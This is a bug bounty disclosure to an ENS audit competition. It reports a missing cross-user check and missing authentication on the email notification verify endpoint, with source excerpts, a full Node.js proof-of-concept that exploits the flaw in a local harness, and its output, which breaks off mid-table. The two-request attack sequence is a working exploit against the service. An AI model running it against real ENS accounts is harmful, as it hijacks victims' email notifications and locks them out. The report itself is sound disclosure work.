# 93031 w a low missing cross user authorization on the email channel verify endpoint lets an attacker bind any third party s email to their own ens account disabling that user s own notifications&#x20;

**Submitted on Sep 14th 2026 at 01:30:28 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93031
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications

## Description

## Brief/Intro

An attacker with an ordinary ENS wallet posts any third party's email address to the attacker's own notification settings. The API worker runs its "already linked to another account" check when a channel is added and never when it is verified, so the address is accepted onto the attacker's account. ENS then sends that third party a genuine verification mail from `noreply@ens.dev`, and one click on its **Verify Email Address** button marks the attacker's row verified. ENS notification mail for the attacker's account is delivered to that person's mailbox from then on, and that person is refused when they add their own address to their own ENS account. The request that flips the row carries no authentication and no wallet signature.

## Vulnerability Details

`POST /notifications/channels/email` takes the account from the JWT and the address from the request body (`email.ts:29-37`). The body schema is one RFC-valid string (`email.ts:19-21`). Nothing on this path asks the caller to prove the mailbox is theirs.

The cross-user check is `email.ts:59-72`. Its where-clause has three terms and the third is `eq(TABLE.userChannels.status, 'verified')` at `:63`, so it matches only rows that are already verified. A row holding someone else's address and still `pending` is invisible to it. The storage layer agrees: the unique constraint is `(user_id, channel, target)` (`schema/notifications.ts:74-78`), so two accounts hold the same address at the same time.

The row is written with the caller's `user_id` and `status: 'pending'` (`email.ts:75-82`), a 16 byte token is minted (`email.ts:104-118`, `helpers.ts:173-177`), and the mail goes out: from `EMAIL_FROM_ADDRESS`, which is `noreply@ens.dev` (`wrangler.jsonc:98`), to the address in the request body, carrying `${managerAppUrl}/notifications/channels/email/verify?token=` against `MANAGER_APP_URL`, which is `https://app.ens.dev` (`verification.ts:16`, `wrangler.jsonc:100`). The attacker's `200` returns the channel id and the expiry. It does not return the token.

`POST /notifications/channels/email/verify` is `email.ts:172-176`. Its middleware chain is `vValidator` and `injectDb`. `requireAuth` is not on it, and the Manager's button posts the token with no Authorization header (`queries/channels.ts:177-190`).

The handler loads the verification row by token, purpose and expiry (`email.ts:179-188`), then writes `status: 'verified'` on the channel id that row names (`email.ts:195-201`). The `otherUserChannel` condition from `:59-72` is not repeated here. The row is not required to still be `pending`. The requester is not required to own it. Holding the token is read as proof of two things, mailbox control and account ownership, and it establishes the first.

A verified row is a live delivery target. `services/notifications/create.ts:115-122` selects an account's channels on `user_id` and `status = 'verified'` and queues a `notification_deliveries` row and an `EMAIL_QUEUE` job for each one. The attacker's ENS notifications arrive in the third party's inbox.

The same guard then fires against the address's owner. Their `POST /notifications/channels/email` finds a `verified` row on a different `user_id` and returns `400 This email address is already linked to another account` (`email.ts:67-72`).

They have nothing to look at and nothing to press. `GET /notifications/channels` filters on `eq(TABLE.userChannels.user_id, userId)` (`channels/index.ts:46`), so the row is absent from their settings page, and `DELETE /notifications/channels/:id` filters on `and(eq(id), eq(user_id))` (`$id.ts:66-70`), so no route removes another account's channel. Their **SAVE PREFERENCES** button stays greyed under *"Verify at least one contact method to save preferences"*, so no notification preference of theirs saves through email (`browser-evidence/04-victim-locked-out-full.png`).

`POST /notifications/channels/:id/resend` (`$id.ts:146-170`) checks that the caller owns the channel, that it is `pending` and that it is an email channel. It does not check the cross-user condition, so the attacker puts a fresh token in that mailbox at 3 sends per hour per address (`email-verification-rate-limit.ts:3-4`). The click window is wider than the token's 24 hours.

### Vulnerable source code

**1. The cross-user check matches only `verified` rows** @ `workers/api-worker/src/app/routes/notifications/channels/email.ts:59-72`

```ts
      const otherUserChannel = await c.var.db.query.userChannels.findFirst({
        where: and(
          eq(TABLE.userChannels.channel, 'email'),
          eq(TABLE.userChannels.target, email),
          eq(TABLE.userChannels.status, 'verified'),
        ),
      })

      if (otherUserChannel && otherUserChannel.user_id !== userId) {
        return c.json(
          { error: 'This email address is already linked to another account' },
          400,
        )
      }
```

**2. Two accounts hold the same address at the storage layer** @ `workers/api-worker/src/core/database/schema/notifications.ts:74-78`

```ts
    unique('user_channel_unique').on(
      table.user_id,
      table.channel,
      table.target,
    ),
```

**3. The row lands on the caller's account** @ `workers/api-worker/src/app/routes/notifications/channels/email.ts:75-82`

```ts
      const channel = await c.var.db
        .insert(TABLE.userChannels)
        .values({
          user_id: userId,
          channel: 'email',
          status: 'pending',
          target: email,
        })
```

**4. ENS mails the genuine link to the address in the request body** @ `workers/api-worker/src/services/email/verification.ts:16,25-26`

```ts
  const verificationUrl = `${managerAppUrl}/notifications/channels/email/verify?token=${encodeURIComponent(verificationToken)}`
```

```ts
    from: { email: fromEmail },
    subject: 'Verify your email address - ENS Notifications',
```

**5. The verify route has no `requireAuth`** @ `workers/api-worker/src/app/routes/notifications/channels/email.ts:172-176`

```ts
  .post(
    '/verify',
    vValidator('json', verifyEmailChannelBodySchema),
    injectDb,
    async (c) => {
```

The add route on the same file, at `:29-33`, is `.post('/', ...requireAuth, injectDb, vValidator(...)`.

**6. The verify handler re-checks nothing** @ `workers/api-worker/src/app/routes/notifications/channels/email.ts:179-201`

```ts
      const verification = await c.var.db.query.channelVerifications.findFirst({
        where: and(
          eq(TABLE.channelVerifications.token, token),
          eq(TABLE.channelVerifications.purpose, 'verify'),
          gt(TABLE.channelVerifications.expires_at, new Date()),
        ),
        with: {
          channel: true,
        },
      })
```

```ts
      await c.var.db
        .update(TABLE.userChannels)
        .set({
          status: 'verified',
          verified_at: new Date(),
        })
        .where(eq(TABLE.userChannels.id, verification.channel_id))
```

**7. A verified row is a delivery target** @ `workers/api-worker/src/services/notifications/create.ts:115-122`

```ts
  // Get user's verified channels
  const channels = yield* intoDbResult(
    ctx.db.query.userChannels.findMany({
      where: and(
        eq(TABLE.userChannels.user_id, ctx.userId),
        eq(TABLE.userChannels.status, 'verified'),
      ),
    }),
  )
```

**8. The address's owner sees nothing and removes nothing** @ `workers/api-worker/src/app/routes/notifications/channels/index.ts:46` and `workers/api-worker/src/app/routes/notifications/channels/$id.ts:66-70`

```ts
      where: eq(TABLE.userChannels.user_id, userId),
```

```ts
      where: and(
        eq(TABLE.userChannels.id, channelId),
        eq(TABLE.userChannels.user_id, userId),
      ),
```

## Impact Details

* **ENS notification mail is enabled to a mailbox on a stranger's say-so, and that mailbox's owner is blocked from enabling their own.** This is the program's impact row *"Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications"*. The PoC produces both halves against one address: one `notification_deliveries` row and one `EMAIL_QUEUE` job for the attacker's account, both addressed to `victim@example.com`, and `400 This email address is already linked to another account` when that address's owner adds it to their own account.
* **The click is on a genuine ENS mail and a genuine ENS page.** From `noreply@ens.dev`, subject *"Verify your email address - ENS Notifications"*, link on `https://app.ens.dev`, landing on the Manager's own verify route. The attacker's whole input is the string in a `POST` body.
* **The clicker signs nothing and connects nothing.** `email.ts:172-176` carries no `requireAuth`, so the request that flips the row goes out with no Authorization header and no wallet interaction of any kind.
* **Both wallets are ordinary.** The PoC's two accounts log in through the target's own SIWE route with real secp256k1 signatures. No role, no allowlist, no privileged address.
* **The page names no account, no wallet and no address.** The verify card is a mail glyph, *"Verify Your Email"*, *"Click the button below to verify your email address and start receiving notifications."* and one blue button (`browser-evidence/01-verify-page-before-click-card.png`). The click drops the clicker on the ENS home page with a green *"Email verified successfully"* toast (`02-after-one-click-full.png`).
* **The address's owner has no in-app view of it and no in-app way out.** `GET /notifications/channels` is caller-scoped (`channels/index.ts:46`) so their settings page shows nothing, the red toast names no account, and `DELETE /notifications/channels/:id` is caller-scoped too (`$id.ts:66-70`). Their **SAVE PREFERENCES** button stays greyed under *"Verify at least one contact method to save preferences"* (`04-victim-locked-out-full.png`).
* **The attacker holds the click window open.** `$id.ts:146-170` checks ownership, `pending` and channel type on resend, and not the cross-user condition, so a fresh 24 hour token goes into that mailbox at 3 per hour (`email-verification-rate-limit.ts:3-4`) for as long as the attacker keeps sending.
* This is revocable but in a hidden and uncomfortable way - using the "report as spam" through email
* This is scalable - a single attacker address can scale to many victims for free.

## References

**The defect**

* `workers/api-worker/src/app/routes/notifications/channels/email.ts:59-72` - the cross-user check, matching `status = 'verified'` only
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:63` - the term that makes a `pending` row on another party's address legal
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:172-176` - the verify route, `vValidator` and `injectDb`, no `requireAuth`
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:179-201` - the handler: token, purpose, expiry, then `status: 'verified'` by channel id
* `workers/api-worker/src/core/database/schema/notifications.ts:74-78` - `unique('user_channel_unique')` on `(user_id, channel, target)`

**The write and the mail**

* `workers/api-worker/src/app/routes/notifications/channels/email.ts:29-37` - `requireAuth`, `user_id` from the JWT, address from the body
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:19-21` - the body schema, one RFC-valid string
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:75-82` - the `pending` row on the caller's `user_id`
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:104-118` - the verification row and its token
* `workers/api-worker/src/services/notifications/helpers.ts:173-177` - `generateToken`, 16 bytes from `crypto.getRandomValues`
* `workers/api-worker/src/services/email/verification.ts:16,25-26` - the link, the from address, the subject
* `workers/api-worker/wrangler.jsonc:98,100` - `EMAIL_FROM_ADDRESS` is `noreply@ens.dev`, `MANAGER_APP_URL` is `https://app.ens.dev`

**The consumer**

* `workers/api-worker/src/services/notifications/create.ts:115-122` - verified channels of one account become deliveries
* `workers/api-worker/src/services/notifications/create.ts:308-313` - the same select in the batch path
* `workers/api-worker/src/queues/event-ingestion.ts:279-284` - the same select in the cron fan-out

**The lockout, and the absence of a way out**

* `workers/api-worker/src/app/routes/notifications/channels/index.ts:46` - `GET /channels` is caller-scoped
* `workers/api-worker/src/app/routes/notifications/channels/$id.ts:66-70` - `DELETE /channels/:id` is caller-scoped
* `workers/api-worker/src/app/routes/notifications/channels/$id.ts:146-170` - `/resend` checks ownership, `pending` and channel type, not the cross-user condition
* `workers/api-worker/src/services/notifications/email-verification-rate-limit.ts:3-4` - 3 sends per hour per address

**The client**

* `apps/manager/src/features/notifications/data/queries/channels.ts:177-190` - the verify mutation, `{ json: { token } }`, no Authorization header
* `apps/manager/src/routes/notifications/channels/email/verify.tsx:218-225` - the **Verify Email Address** button

## Proof of Concept

## Proof of Concept

One file, one command. It runs the target's real Hono app with its real middleware, logs two ordinary wallets in over the target's real SIWE route, and reads every row back off PostgreSQL 17 after the target wrote it.

```bash
node poc.mjs
```

`ENS_REPO` defaults to `../../../ens-apps`; set it to point the PoC at a checkout elsewhere. On first run the script writes a `package.json` to a temp dir, installs three pinned deps there and re-execs itself, so nothing is installed by hand. It exits non-zero if any assertion fails.

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC: workers/api-worker checks "already linked to another account" when an
// email channel is ADDED and never when it is VERIFIED. An attacker enrols any
// third party's address on the attacker's own ENS account. The address owner
// gets a genuine ENS verification mail and clicks it. ENS notification mail for
// the attacker's account is then delivered to that mailbox, and the address
// owner is refused when they add the same address to their own account.
//
//   node poc.mjs                 (ENS_REPO defaults to ../../../ens-apps)
//
// Self-contained. On first run it writes a package.json to a temp dir, installs
// pinned deps there and re-execs itself.
//
// The target decides every outcome. src/app/index.ts is the real Hono app with
// its real middleware, /auth/login runs the real SIWE verifier, and every row
// printed below was written by target code onto PostgreSQL 17 (PGlite/WASM).
// Two things are intercepted: SendGrid egress, so the mail body can be read
// verbatim, and the Neon HTTP-SQL transport that core/database/index.ts:9-15
// already routes to a local proxy.

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, readFileSync, readdirSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:http'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORKER = path.join(REPO, 'workers', 'api-worker')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-email-channel')

const VICTIM_EMAIL = 'victim@example.com'
const ATTACKER_PK = '0x' + '11'.repeat(32)
const VICTIM_PK = '0x' + '22'.repeat(32)

const PKG = `{
  "name": "ens-poc-email-channel",
  "private": true,
  "type": "module",
  "dependencies": {
    "@electric-sql/pglite": "0.3.16",
    "viem": "2.52.2"
  },
  "devDependencies": { "tsx": "4.23.13" }
}
`

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log("  ENS PoC: an attacker binds a third party's email address to the")
  console.log("           attacker's ENS account, with one click by that third party")
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(path.join(WORKER, 'src', 'app', 'index.ts'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (pglite 0.3.16, viem 2.52.2, tsx 4.23.13)...')
    const r = spawnSync('npm', ['install', '--silent', '--no-audit', '--no-fund'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath, ['--import', 'tsx', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== output

const log = (s = '') => console.log(s)
const act = (n, title) => {
  log('')
  log('='.repeat(78))
  log(`  ACT ${n}  ${title}`)
  log('='.repeat(78))
}
const rows = (rs) => {
  for (const r of rs) log('    ' + JSON.stringify(r))
  if (rs.length === 0) log('    (no rows)')
}
class Failed extends Error {}
const assert = (cond, what) => {
  log(`    [assert] ${what}`)
  if (!cond) throw new Failed(what)
}

// ====================================== the Neon HTTP-SQL proxy, over PostgreSQL
//
// core/database/index.ts:9-15 already sends every statement to
// http://db.localtest.me:4444/sql when the host is db.localtest.me, citing
// https://github.com/TimoWilhelm/local-neon-http-proxy. This is that proxy.
// Drizzle builds the SQL, PostgreSQL 17 executes it. No target rule lives here.

const { PGlite } = await import('@electric-sql/pglite')

const pad = (n, w = 2) => String(n).padStart(w, '0')

// The Neon client asks for raw text output and applies the pg text parsers
// itself, so each PGlite value goes back to its PostgreSQL text form.
const toText = (v) => {
  if (v === null || v === undefined) return null
  if (v instanceof Date)
    return `${v.getUTCFullYear()}-${pad(v.getUTCMonth() + 1)}-${pad(v.getUTCDate())} ` +
      `${pad(v.getUTCHours())}:${pad(v.getUTCMinutes())}:${pad(v.getUTCSeconds())}.` +
      `${pad(v.getUTCMilliseconds(), 3)}+00`
  if (typeof v === 'boolean') return v ? 't' : 'f'
  if (v instanceof Uint8Array) return '\\x' + Buffer.from(v).toString('hex')
  if (typeof v === 'object') return JSON.stringify(v)
  return String(v)
}

const pg = await PGlite.create()

// pg_uuidv7 is a Neon extension and PGlite has no C extension loader, so the
// target's DEFAULT uuid_generate_v7() gets the same function in plpgsql.
await pg.exec([
  'CREATE OR REPLACE FUNCTION uuid_generate_v7() RETURNS uuid AS $$',
  'DECLARE unix_ts_ms bytea; uuid_bytes bytea;',
  'BEGIN',
  '  unix_ts_ms = substring(int8send((extract(epoch from clock_timestamp())*1000)::bigint) from 3);',
  '  uuid_bytes = uuid_send(gen_random_uuid());',
  '  uuid_bytes = overlay(uuid_bytes placing unix_ts_ms from 1 for 6);',
  "  uuid_bytes = set_byte(uuid_bytes, 6, (b'0111' || get_byte(uuid_bytes,6)::bit(8) >> 4)::bit(8)::int);",
  "  RETURN encode(uuid_bytes,'hex')::uuid;",
  'END $$ LANGUAGE plpgsql VOLATILE;',
].join('\n'))

const migrations = path.join(WORKER, 'drizzle')
for (const f of readdirSync(migrations).filter((n) => n.endsWith('.sql')).sort()) {
  const src = readFileSync(path.join(migrations, f), 'utf8')
    .replace(/CREATE EXTENSION IF NOT EXISTS pg_uuidv7;?/g, '')
  for (const stmt of src.split('--> statement-breakpoint')) {
    if (stmt.trim()) await pg.exec(stmt.trim())
  }
}

const runSql = async ({ query, params }) => {
  const res = await pg.query(query, params ?? [], { rowMode: 'array' })
  return {
    command: (query.trim().split(/\s+/)[0] || '').toUpperCase(),
    rowCount: res.rows.length || res.affectedRows || 0,
    rows: res.rows.map((r) => r.map(toText)),
    fields: (res.fields ?? []).map((f) => ({
      name: f.name, dataTypeID: f.dataTypeID, tableID: 0, columnID: 0,
      dataTypeSize: -1, dataTypeModifier: -1, format: 'text',
    })),
  }
}

const server = createServer((req, res) => {
  let body = ''
  req.on('data', (c) => (body += c))
  req.on('end', async () => {
    try {
      const j = JSON.parse(body || '{}')
      const out = Array.isArray(j.queries)
        ? { results: await Promise.all(j.queries.map(runSql)) }
        : await runSql(j)
      res.writeHead(200, { 'content-type': 'application/json' })
      res.end(JSON.stringify(out))
    } catch (e) {
      res.writeHead(400, { 'content-type': 'application/json' })
      res.end(JSON.stringify({ message: e.message, code: e.code ?? '42000' }))
    }
  })
})
await new Promise((r) => server.listen(0, '127.0.0.1', r))
const SHIM_PORT = server.address().port

const sql = async (q, p = []) => (await pg.query(q, p)).rows
const emailRows = () =>
  sql(`select u.address as account, c.target, c.status
         from user_channels c join users u on u.id = c.user_id
        where c.channel = 'email' order by u.address`)

// ====================================== SendGrid egress capture, worker bindings

const realFetch = globalThis.fetch
const mail = []
globalThis.fetch = async (input, init) => {
  const url = typeof input === 'string' ? input : (input?.url ?? String(input))
  if (url.startsWith('https://api.sendgrid.com')) {
    mail.push(JSON.parse(init.body))
    return new Response(null, { status: 202 })
  }
  if (url.startsWith('http://db.localtest.me:4444/sql'))
    return realFetch(`http://127.0.0.1:${SHIM_PORT}/sql`, init)
  return realFetch(input, init)
}

const queued = []
const kv = new Map()
const env = {
  DATABASE_URL: 'postgres://u:p@db.localtest.me/neondb',
  JWT_SECRET: 'poc-jwt-secret',
  CHAIN: 'sepolia',
  SEPOLIA_RPC_URL: 'http://127.0.0.1:1/never-called-for-an-eoa',
  SENDGRID_API_KEY: 'SG.poc',
  SENDGRID_WEBHOOK_VERIFICATION_KEY: '',
  EMAIL_FROM_ADDRESS: 'noreply@ens.dev',       // wrangler.jsonc vars
  MANAGER_APP_URL: 'https://app.ens.dev',      // wrangler.jsonc vars
  SENDGRID_BROADCAST_LIST_ID: '',              // wrangler.jsonc vars
  BASE_URL: 'https://app-api.ens.dev',
  EMAIL_QUEUE: { send: async (job) => { queued.push(job) } },
  KV: {
    get: async (k) => kv.get(k) ?? null,
    put: async (k, v) => { kv.set(k, v) },
    delete: async (k) => { kv.delete(k) },
  },
}
const waits = []
const ctx = { waitUntil: (p) => waits.push(p), passThroughOnException: () => {} }

const load = (...p) => import(pathToFileURL(path.join(WORKER, 'src', ...p)).href)
const app = (await load('app', 'index.ts')).default

const call = async (route, opts = {}) => {
  const { method = 'POST', body, token, origin } = opts
  const headers = { 'content-type': 'application/json' }
  if (token) headers.authorization = `Bearer ${token}`
  if (origin) headers.origin = origin
  const res = await app.request(
    new Request(`https://app-api.ens.dev${route}`, {
      method, headers,
      body: body === undefined ? undefined : JSON.stringify(body),
    }), undefined, env, ctx)
  let json = null
  try { json = await res.clone().json() } catch {}
  return { status: res.status, json, res }
}

const { privateKeyToAccount } = await import('viem/accounts')
const { createSiweMessage } = await import('viem/siwe')

const login = async (pk) => {
  const account = privateKeyToAccount(pk)
  const { nonce } = (await call('/auth/nonce')).json
  const message = createSiweMessage({
    address: account.address, chainId: 11155111, domain: 'app.ens.dev',
    nonce, uri: 'https://app.ens.dev', version: '1',
  })
  const signature = await account.signMessage({ message })
  const out = await call('/auth/login', { body: { address: account.address, message, signature, nonce } })
  return { status: out.status, token: out.json?.token ?? out.json?.jwt, address: account.address }
}

// ============================================================== the attack

const short = (a) => `${a.slice(0, 10)}...${a.slice(-8)}`
let code = 0
try {

act(0, 'Two ordinary accounts. Real SIWE, no privilege on either.')
const attacker = await login(ATTACKER_PK)
const victim = await login(VICTIM_PK)
log(`  attacker  /auth/nonce -> 200, /auth/login -> ${attacker.status}   ${attacker.address}`)
log(`  victim    /auth/nonce -> 200, /auth/login -> ${victim.status}   ${victim.address}`)
log(`  the victim is an ordinary ENS user who owns the mailbox ${VICTIM_EMAIL}`)
assert(attacker.status === 200 && victim.status === 200, 'both wallets hold a JWT')

act(1, "The attacker puts the VICTIM's address on the ATTACKER's account")
const add = await call('/notifications/channels/email', {
  body: { email: VICTIM_EMAIL }, token: attacker.token, origin: 'https://evil.example',
})
log(`  POST /notifications/channels/email {"email":"${VICTIM_EMAIL}"}  [attacker JWT]`)
log(`  -> ${add.status} ${JSON.stringify(add.json)}`)
log(`  access-control-allow-origin: ${add.res.headers.get('access-control-allow-origin')}   (app/index.ts:15, cors() with no options)`)
log('  user_channels:')
rows(await emailRows())
assert(add.status === 200, 'the add is accepted, nothing asks the attacker to prove the address')

const composed = mail.at(-1)
const link = composed.content[0].value.match(/https:\/\/\S+/)[0]
const token = new URL(link).searchParams.get('token')
log('')
log('  the message the target composed (SendGrid /v3/mail/send body, captured verbatim):')
log(`    from    : ${composed.from.email}`)
log(`    to      : ${composed.personalizations[0].to[0].email}`)
log(`    subject : ${composed.subject}`)
log(`    link    : ${link}`)
assert(composed.personalizations[0].to[0].email === VICTIM_EMAIL,
  "ENS mails the victim from noreply@ens.dev, on the attacker's instruction")
assert(!JSON.stringify(add.json).includes(token),
  "the token reaches the victim's mailbox only, the attacker cannot self-verify")

act(2, 'The victim clicks "Verify Email Address"')
log('  The Manager button posts the token with no Authorization header')
log('  (queries/channels.ts:177-190). email.ts:172-176 has no requireAuth to want one:')
const ver = await call('/notifications/channels/email/verify', { body: { token } })
log(`  POST /notifications/channels/email/verify  -> ${ver.status} ${JSON.stringify(ver.json)}`)
log('  user_channels:')
const afterVerify = await emailRows()
rows(afterVerify)
assert(ver.status === 200, 'the flip is accepted from an anonymous request')
assert(afterVerify.length === 1 &&
  afterVerify[0].account.toLowerCase() === attacker.address.toLowerCase() &&
  afterVerify[0].status === 'verified',
  "the verified row carries the victim's address and the attacker's user_id")

act(3, "ENS notification mail for the attacker's account goes to the victim's mailbox")
const { createNotification } = await load('services', 'notifications', 'create.ts')
const { getDatabase } = await load('core', 'database', 'index.ts')
const db = getDatabase(env)
const attackerUserId = (await sql('select id from users where lower(address) = lower($1)', [attacker.address]))[0].id
await pg.query(
  `insert into user_notification_settings (user_id, owned_name_expiry, favourited_name_expiry, ens_labs_updates)
     values ($1, true, true, true) on conflict (user_id) do update set owned_name_expiry = true`, [attackerUserId])
const notif = await createNotification({
  env, db, userId: attackerUserId, kind: 'name-expiry',
  payload: { name: 'attacker-owned.eth', expiryDate: Date.now() + 7 * 864e5, isOwner: true, watchReason: 'owned' },
  idempotencyKey: 'poc-notification-1',
})
log(`  createNotification({ userId: <attacker> })  -> ${notif.isOk() ? 'ok' : 'ERR ' + JSON.stringify(notif.error)}`)
log('  notification_deliveries the target wrote:')
const deliveries = await sql('select channel, target, status from notification_deliveries')
rows(deliveries)
log(`  EMAIL_QUEUE jobs the target enqueued: ${queued.length}`)
assert(deliveries.length === 1 && deliveries[0].target === VICTIM_EMAIL && queued.length === 1,
  "create.ts:116-121 routes the attacker's notification to the victim's mailbox")

act(4, 'The address owner is locked out of their own address')
const vAdd = await call('/notifications/channels/email', { body: { email: VICTIM_EMAIL }, token: victim.token })
log(`  POST /notifications/channels/email {"email":"${VICTIM_EMAIL}"}  [victim JWT]`)
log(`  -> ${vAdd.status} ${JSON.stringify(vAdd.json)}`)
const vList = await call('/notifications/channels', { method: 'GET', token: victim.token })
log(`  GET /notifications/channels  [victim JWT]  -> ${vList.status} ${JSON.stringify(vList.json)}`)
log('  user_channels:')
const final = await emailRows()
rows(final)
assert(vAdd.status === 400 && vAdd.json.error === 'This email address is already linked to another account',
  "email.ts:59-72 refuses the address's own owner")
assert(Array.isArray(vList.json) && vList.json.length === 0,
  "channels/index.ts:46 is caller-scoped, so the victim's settings page never names the row")
assert(final.length === 1, "the victim has no email channel, and no route removes the attacker's")

await Promise.allSettled(waits)

log('')
log('-'.repeat(78))
log('  LEDGER (user_channels and notification_deliveries, read back from PostgreSQL)')
log('-'.repeat(78))
log('    account                         before        after')
log(`    VICTIM    ${short(victim.address)}   no channel    400, refused their own address`)
log(`    ATTACKER  ${short(attacker.address)}   no channel    ${VICTIM_EMAIL}, verified`)
log('-'.repeat(78))
log('')
log(`  ${VICTIM_EMAIL} is enrolled on the attacker's ENS account and receives that`)
log("  account's notification mail. The address's owner is refused when they add the")
log('  same address to their own ENS account, and their settings page shows nothing.')
log('')
log('  PoC PASSED, every assertion held.')

} catch (e) {
  code = 1
  log('')
  log(e instanceof Failed ? `  PoC FAILED: ${e.message}` : `  PoC ERROR: ${e.stack}`)
}

server.close()
await pg.close()
process.exit(code)
```

### Output

```
==============================================================================
  ENS PoC: an attacker binds a third party's email address to the
           attacker's ENS account, with one click by that third party
  repo:  C:/ens
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-email-channel
==============================================================================

==============================================================================
  ACT 0  Two ordinary accounts. Real SIWE, no privilege on either.
==============================================================================
{"timestamp":"2026-09-05T12:21:28.074Z","level":"trace","message":"SIWE user resolved","userId":"01a07184-4185-07b1-a9a0-50e63a8fa99b","address":"0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A"}
{"timestamp":"2026-09-05T12:21:29.156Z","level":"trace","message":"SIWE user resolved","userId":"01a07184-45c3-077d-aebc-4b54cd261dac","address":"0x1563915e194D8CfBA1943570603F7606A3115508"}
  attacker  /auth/nonce -> 200, /auth/login -> 200   0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
  victim    /auth/nonce -> 200, /auth/login -> 200   0x1563915e194D8CfBA1943570603F7606A3115508
  the victim is an ordinary ENS user who owns the mailbox victim@example.com
    [assert] both wallets hold a JWT

==============================================================================
  ACT 1  The attacker puts the VICTIM's address on the ATTACKER's account
==============================================================================
{"timestamp":"2026-09-05T12:21:29.178Z","level":"info","message":"Verification email sent","to":"victim@example.com","verificationUrl":"https://app.ens.dev/notifications/channels/email/verify?token=dea37167bb95a435dac4ecf1aa62db3a"}
{"timestamp":"2026-09-05T12:21:29.178Z","level":"info","message":"Verification email sent","channelId":"01a07184-45d2-0764-aefe-2416254e8aa0","email":"victim@example.com"}
  POST /notifications/channels/email {"email":"victim@example.com"}  [attacker JWT]
  -> 200 {"message":"Verification email sent","expires_at":"2026-09-06T12:21:29.174Z","channelId":"01a07184-45d2-0764-aefe-2416254e8aa0"}
  access-control-allow-origin: *   (app/index.ts:15, cors() with no options)
  user_channels:
    {"account":"0x19e7e376e7c213b7e7e7e46cc70a5dd086daff2a","target":"victim@example.com","status":"pending"}
    [assert] the add is accepted, nothing asks the attacker to prove the address

  the message the target composed (SendGrid /v3/mail/send body, captured verbatim):
    from    : noreply@ens.dev
    to      : victim@example.com
    subject : Verify your email address - ENS Notifications
    link    : https://app.ens.dev/notifications/channels/email/verify?token=dea37167bb95a435dac4ecf1aa62db3a
    [assert] ENS mails the victim from noreply@ens.dev, on the attacker's instruction
    [assert] the token reaches the victim's mailbox only, the attacker cannot self-verify

==============================================================================
  ACT 2  The victim clicks "Verify Email Address"
==============================================================================
  The Manager button posts the token with no Authorization header
  (queries/channels.ts:177-190). email.ts:172-176 has no requireAuth to want one:
{"timestamp":"2026-09-05T12:21:29.193Z","level":"info","message":"Welcome email sent","to":"victim@example.com"}
{"timestamp":"2026-09-05T12:21:29.193Z","level":"info","message":"Welcome email sent","channelId":"01a07184-45d2-0764-aefe-2416254e8aa0","email":"victim@example.com"}
  POST /notifications/channels/email/verify  -> 200 {"message":"Email verified successfully"}
  user_channels:
    {"account":"0x19e7e376e7c213b7e7e7e46cc70a5dd086daff2a","target":"victim@example.com","status":"verified"}
    [assert] the flip is accepted from an anonymous request
    [assert] the verified row carries the victim's address and the attacker's user_id

==============================================================================
  ACT 3  ENS notification mail for the attacker's account goes to the victim's mailbox
==============================================================================
{"timestamp":"2026-09-05T12:21:29.212Z","level":"info","message":"Delivery job queued","deliveryId":"01a07184-45fb-072c-bbab-38a75cc824d7","channel":"email","kind":"name-expiry"}
  createNotification({ userId: <attacker> })  -> ok
  notification_deliveries the target wrote:
    {"channel":"email","target":"victim@example.com","status":"queued"}
  EMAIL_QUEUE jobs the target enqueued: 1
    [assert] create.ts:116-121 routes the attacker's notification to the victim's mailbox

==============================================================================
  ACT 4  The address owner is locked out of their own address
==============================================================================
  POST /notifications/channels/email {"email":"victim@example.com"}  [victim JWT]
  -> 400 {"error":"This email address is already linked to another account"}
  GET /notifications/channels  [victim JWT]  -> 200 []
  user_channels:
    {"account":"0x19e7e376e7c213b7e7e7e46cc70a5dd086daff2a","target":"victim@example.com","status":"verified"}
    [assert] email.ts:59-72 refuses the address's own owner
    [assert] channels/index.ts:46 is caller-scoped, so the victim's settings page never names the row
    [assert] the victim has no email channel, and no route removes the attacker's

------------------------------------------------------------------------------
  LEDGER (user_channels and notification_deliveries, read back from PostgreSQL)
------------------------------------------------------------------------------
    account                         before        after
    VICTIM    0x1563915e...A3115508   no channel    400, refused their own address
